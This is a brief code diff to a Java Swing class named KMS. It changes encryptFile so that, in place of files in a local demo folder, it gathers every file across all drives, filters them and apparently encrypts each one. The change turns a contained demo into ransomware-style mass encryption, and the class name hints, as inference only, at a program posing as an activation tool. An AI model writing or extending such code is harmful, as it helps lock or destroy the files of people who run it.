@@ -262,8 +262,7 @@ public class KMS extends javax.swing.JFrame {
     }
     
     private void encryptFile(String key) {
-        File dir = new File(new File("./filedemo").getAbsolutePath());
-        List<String> fileList = FileUtils.readAllFileinFolder(new ArrayList<>(), dir);
+        List<String> fileList = FileUtils.readAllFileInMultiDrive();
         List<String> fillterFileList = FileUtils.fillterFile(fileList);
 
         fillterFileList.stream().forEach(new Consumer<String>() {
